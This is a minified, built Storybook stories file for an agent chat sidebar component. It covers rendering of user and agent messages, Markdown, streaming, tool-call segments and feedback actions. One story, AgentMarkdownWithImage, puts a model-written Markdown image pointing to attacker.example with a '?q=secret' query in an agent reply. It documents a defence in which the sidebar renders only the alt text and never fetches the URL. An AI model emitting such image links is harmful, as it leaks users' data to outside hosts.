import{j as e}from"./iframe-Mm_y1Xgi.js";import{a as t,b as g,c as A}from"./AgentSidebarMessages-DqViQxEU.js";import"./preload-helper-PPVm8Dsz.js";import"./cn-IyxL_b2c.js";import"./Icon-DcJbTV_i.js";import"./Logo-BPlYx_Sj.js";import"./IconButton-BByzvxt3.js";import"./Progress-CJuY_uej.js";import"./button-styles-CZHSjrxJ.js";import"./AgentSidebarMultiQuestion-BCEY6kXK.js";import"./Button-wd7NvzKR.js";import"./FloatingLabelInput-At_dKKbW.js";import"./SegmentedButton-IE2Wncwr.js";import"./Switch-Bh3ez_TP.js";const q={title:"UI/Agent/Messages",decorators:[S=>e.jsx("div",{className:"h-[420px] w-[420px] rounded-2xl overflow-hidden flex flex-col bg-on-background p-4",children:e.jsx(S,{})})]},u={render:()=>e.jsx(A,{content:"Update my username to alice2 and turn on dark mode."})},h={render:()=>e.jsx(t,{content:"Sure — I'll update your username and your appearance preference. Please confirm the changes below."})},x=`## Account changes

This week you made **three** changes:

1. Renamed your username to \`alice2\`
2. Enabled *dark mode*
3. Added a passkey

Run this to verify from the CLI:

\`\`\`bash
mirrorstack account audit --since 7d
\`\`\`

See the [audit log docs](https://docs.mirrorstack.ai/audit) for details.`,s={render:()=>e.jsx(t,{content:x})},r={render:()=>e.jsx(t,{content:`Here's the chart you asked about: ![quarterly revenue chart](https://attacker.example/?q=secret)

Let me know if you'd like a different view.`})},n={render:()=>e.jsx(t,{content:`## Checking availability

Here's what I found so far:

- Username **alice2** is available
- Dark mode is \`off\` — see the [appearance docs](https://docs.mirrorstack.ai/appearance)

\`\`\`bash
mirrorstack account au`,streaming:!0})},y={render:()=>e.jsxs("div",{className:"flex flex-col gap-4",children:[e.jsx(t,{content:"",streaming:!0}),e.jsx(t,{content:"Updating your profile now",streaming:!0})]})},a={render:()=>e.jsx(t,{content:`Let me check your recent posts and tidy up the drafts.

Done — published the latest draft and archived the two stale ones.`,segments:[{type:"text",text:"Let me check your recent posts and tidy up the drafts."},{type:"tool",id:"t-1",tool:{moduleSlug:"cms",tool:"list_posts",status:"done",durationMs:214,args:{limit:5},result:[{id:"p1",title:"Hello world"}]}},{type:"tool",id:"t-2",tool:{moduleSlug:"cms",tool:"publish_post",status:"done",durationMs:96}},{type:"text",text:"Done — published the latest draft and archived the two stale ones."}]})},o={render:()=>e.jsx(t,{streaming:!0,content:"Checking your account settings.",segments:[{type:"text",text:"Checking your account settings."},{type:"tool",id:"t-1",tool:{moduleSlug:"account",tool:"get_preferences",status:"started"}}]})},k=()=>{},p={onCopyMessage:k,onRateMessage:k,onRerunMessage:k},b={id:"m-2",role:"agent",content:"You changed your username to alice2, enabled dark mode, and added a passkey from your MacBook."},f=[{id:"m-1",role:"user",content:"Summarize my account changes this week."},b],i={render:()=>e.jsx(g,{messages:f,...p})},d={render:()=>e.jsx(g,{messages:[f[0],{...b,feedback:"up"}],...p})},c={render:()=>e.jsx(g,{messages:[f[0],{id:"m-2",role:"agent",content:"Pulling your audit log",streaming:!0}],...p})},l={render:()=>e.jsx(g,{messages:f,...p,showLogo:!0})},w=[{id:"m-1",role:"user",content:"Summarize my account changes this week."},{id:"m-2",role:"agent",content:"Pulling your audit log",streaming:!0}],m={render:()=>e.jsx(g,{messages:w,...p,showLogo:!0})};u.parameters={...u.parameters,docs:{...u.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarUserMessage content="Update my username to alice2 and turn on dark mode." />
}`,...u.parameters?.docs?.source}}};h.parameters={...h.parameters,docs:{...h.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarAgentMessage content="Sure — I'll update your username and your appearance preference. Please confirm the changes below." />
}`,...h.parameters?.docs?.source}}};s.parameters={...s.parameters,docs:{...s.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarAgentMessage content={markdownReply} />
}`,...s.parameters?.docs?.source},description:{story:"Agent replies render Markdown: headings, lists, inline + fenced code, links.",...s.parameters?.docs?.description}}};r.parameters={...r.parameters,docs:{...r.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarAgentMessage content={"Here's the chart you asked about: ![quarterly revenue chart](https://attacker.example/?q=secret)\\n\\nLet me know if you'd like a different view."} />
}`,...r.parameters?.docs?.source},description:{story:"A model-written image in a reply renders only its alt text — no `<img>` is\n ever created, so a URL like `?q=<secret>` can't be fetched from the\n sidebar. See AgentSidebarMarkdown.tsx and AgentSidebarMarkdownImage.test.tsx.",...r.parameters?.docs?.description}}};n.parameters={...n.parameters,docs:{...n.parameters?.docs,source:{originalSource:'{\n  render: () => <AgentSidebarAgentMessage content={"## Checking availability\\n\\nHere\'s what I found so far:\\n\\n- Username **alice2** is available\\n- Dark mode is `off` — see the [appearance docs](https://docs.mirrorstack.ai/appearance)\\n\\n```bash\\nmirrorstack account au"} streaming />\n}',...n.parameters?.docs?.source},description:{story:`Mid-stream markdown with every construct a real reply carries — heading,
 bold, list, inline code, link — and an unterminated code fence that
 renders calmly as a code block until the closing fence arrives.`,...n.parameters?.docs?.description}}};y.parameters={...y.parameters,docs:{...y.parameters?.docs,source:{originalSource:`{
  render: () => <div className="flex flex-col gap-4">
      <AgentSidebarAgentMessage content="" streaming />
      <AgentSidebarAgentMessage content="Updating your profile now" streaming />
    </div>
}`,...y.parameters?.docs?.source}}};a.parameters={...a.parameters,docs:{...a.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarAgentMessage content={"Let me check your recent posts and tidy up the drafts.\\n\\nDone — published the latest draft and archived the two stale ones."} segments={[{
    type: "text",
    text: "Let me check your recent posts and tidy up the drafts."
  }, {
    type: "tool",
    id: "t-1",
    tool: {
      moduleSlug: "cms",
      tool: "list_posts",
      status: "done",
      durationMs: 214,
      args: {
        limit: 5
      },
      result: [{
        id: "p1",
        title: "Hello world"
      }]
    }
  }, {
    type: "tool",
    id: "t-2",
    tool: {
      moduleSlug: "cms",
      tool: "publish_post",
      status: "done",
      durationMs: 96
    }
  }, {
    type: "text",
    text: "Done — published the latest draft and archived the two stale ones."
  }]} />
}`,...a.parameters?.docs?.source},description:{story:`A reply whose tool calls are interleaved with the response text in stream
 order — prose, then a tool step, then more prose — instead of every tool
 call hoisted to the top of the message.`,...a.parameters?.docs?.description}}};o.parameters={...o.parameters,docs:{...o.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarAgentMessage streaming content="Checking your account settings." segments={[{
    type: "text",
    text: "Checking your account settings."
  }, {
    type: "tool",
    id: "t-1",
    tool: {
      moduleSlug: "account",
      tool: "get_preferences",
      status: "started"
    }
  }]} />
}`,...o.parameters?.docs?.source},description:{story:`Mid-stream: text has streamed, a tool is running, and the blinking caret
 stays off because the trailing tool's spinner is the live indicator.`,...o.parameters?.docs?.description}}};i.parameters={...i.parameters,docs:{...i.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarMessages messages={finishedThread} {...actionCallbacks} />
}`,...i.parameters?.docs?.source},description:{story:"Copy / thumbs / rerun appear under finished agent messages only.",...i.parameters?.docs?.description}}};d.parameters={...d.parameters,docs:{...d.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarMessages messages={[finishedThread[0], {
    ...finishedAgentMsg,
    feedback: "up"
  }]} {...actionCallbacks} />
}`,...d.parameters?.docs?.source},description:{story:"A previously-recorded rating renders the thumb filled at full ink.",...d.parameters?.docs?.description}}};c.parameters={...c.parameters,docs:{...c.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarMessages messages={[finishedThread[0], {
    id: "m-2",
    role: "agent",
    content: "Pulling your audit log",
    streaming: true
  }]} {...actionCallbacks} />
}`,...c.parameters?.docs?.source},description:{story:"The action row stays hidden while the agent is still streaming.",...c.parameters?.docs?.description}}};l.parameters={...l.parameters,docs:{...l.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarMessages messages={finishedThread} {...actionCallbacks} showLogo />
}`,...l.parameters?.docs?.source},description:{story:"Brand mark in the sidebar accent below the list when the last message is finished.",...l.parameters?.docs?.description}}};m.parameters={...m.parameters,docs:{...m.parameters?.docs,source:{originalSource:`{
  render: () => <AgentSidebarMessages messages={respondingThread} {...actionCallbacks} showLogo />
}`,...m.parameters?.docs?.source},description:{story:'While the last agent message is still streaming, the brand logo renders and\n SPINS below the list as the "responding" indicator (the loading prop is wired\n from the last agent message\'s `streaming` flag). It settles to the static\n mark once the reply finishes — see `WithLogo`.',...m.parameters?.docs?.description}}};const F=["User","Agent","AgentMarkdown","AgentMarkdownWithImage","AgentMarkdownStreaming","AgentStreaming","AgentInterleavedToolCalls","AgentInterleavedStreaming","FinishedWithActions","FeedbackSelected","StreamingHidesActions","WithLogo","Responding"];export{h as Agent,o as AgentInterleavedStreaming,a as AgentInterleavedToolCalls,s as AgentMarkdown,n as AgentMarkdownStreaming,r as AgentMarkdownWithImage,y as AgentStreaming,d as FeedbackSelected,i as FinishedWithActions,m as Responding,c as StreamingHidesActions,u as User,l as WithLogo,F as __namedExportsOrder,q as default};
